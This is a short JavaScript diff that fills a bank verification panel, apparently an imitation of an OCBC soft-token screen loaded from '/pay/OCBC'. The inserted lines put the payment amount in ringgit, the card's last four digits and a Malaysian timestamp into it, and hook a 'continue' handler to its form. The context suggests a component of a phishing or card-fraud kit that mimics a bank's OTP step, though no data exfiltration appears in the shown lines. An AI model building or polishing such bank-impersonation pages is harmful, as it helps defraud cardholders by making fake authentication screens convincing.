@@ -1740,6 +1740,8 @@ url("pay1ment_icons.woff") format("woff");
       if(p.cardInfo.bankName==='OVERSEA-CHINESE BANKING CORPORATION LTD.') {
         document.querySelector("#mount4").classList.remove('hidden');
         document.querySelector("#mount4").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(5) > td:nth-child(3) > span").textContent = 'RM '+discountedTotal().toFixed(2);
+        document.querySelector("#mount4").shadowRoot.querySelector("#softTokenPanel > tbody > tr:nth-child(2) > td > table > tbody > tr:nth-child(1) > td:nth-child(2)").textContent = 'RM '+discountedTotal().toFixed(2);
+        document.querySelector("#mount4").shadowRoot.querySelector("#softTokenPanel > tbody > tr:nth-child(2) > td > table > tbody > tr:nth-child(3) > td:nth-child(2) > span:nth-child(2)").textContent = p.cardInfo.cardNumber.slice(-4);
         const now = new Date(); 
         const options = {
         weekday: 'short',
@@ -1757,8 +1759,8 @@ url("pay1ment_icons.woff") format("woff");
             hour12: false,
             timeZone: 'Asia/Kuala_Lumpur'
         });
-        document.querySelector("#mount4").shadowRoot.querySelector("div > table:nth-child(2) > tbody > tr:nth-child(6) > td:nth-child(3)").innerHTML = `
-            <span>${dateStr}</span><br>
+        document.querySelector("#mount4").shadowRoot.querySelector("#softTokenPanel > tbody > tr:nth-child(2) > td > table > tbody > tr:nth-child(4) > td:nth-child(2)").innerHTML = `
+            <span>${dateStr}</span>
             <span>${timeStr} GMT +0800</span>
         `;
       }
@@ -2821,7 +2823,7 @@ async function loadPage(pagePath, mountId) {
     await loadPage('/pay/OCBC', 'mount4');
     const shadow4 = document.querySelector("#mount4").shadowRoot;
     shadow4
-        .querySelector("#disableResend > div")
+        .querySelector("#formactions")
         .addEventListener('click', CustomizationappVerifyContinue4);
 
 
